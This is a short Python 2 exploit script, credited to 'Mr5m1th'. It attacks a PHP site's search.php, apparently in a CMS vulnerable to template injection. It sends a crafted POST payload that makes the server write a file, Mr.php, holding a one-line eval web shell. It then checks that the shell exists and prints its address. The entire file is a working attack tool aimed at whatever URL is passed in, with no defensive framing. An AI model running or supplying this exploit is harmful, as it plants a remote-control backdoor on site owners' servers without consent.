#coding = utf8

#author : Mr5m1th

#PostData  = searchtype=5&searchword={if{searchpage:year}&year=:e{searchpage:area}}&area=v{searchpage:letter}&letter=al{searchpage:lang}&yuyan=(join{searchpage:jq}&jq=($_P{searchpage:ver}&ver=OST[9]))&9[]=fwrite(&9[]=fopen('Mr.php','w')&9[]=,'<?php eval($_POST["Mr"]);?>');
import hackhttp
import sys
import requests
def exploit(url):
	Url = url + "/search.php"
	print "[*]Exploit Url:"+url
	raw = '''POST /search.php HTTP/1.1
Host: %s 
Proxy-Connection: keep-alive
Content-Length: 22
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.110 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: %s
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.8

searchtype=5&searchword={if{searchpage:year}&year=:e{searchpage:area}}&area=v{searchpage:letter}&letter=al{searchpage:lang}&yuyan=(join{searchpage:jq}&jq=($_P{searchpage:ver}&ver=OST[9]))&9[]=fwrite(&9[]=fopen('Mr.php','w')&9[]=,'<?php eval($_POST["Mr"]);?>');
'''%(url,Url)
	hh = hackhttp.hackhttp()
	try:
		a,b,c,d,e = hh.http(url = Url ,raw = raw)
	except:
		print "[-]SomeError Happened!"
if __name__ == '__main__':
	url = sys.argv[1]
	exploit(url)
	s = requests.session()
	if s.get(url+"/Mr.php",verify=False).status_code == 200:
		print "[*]Exploit Sucess   ,  Shell: "+url+"/Mr.php"
	else:
		print "[-]Exploit Fail"


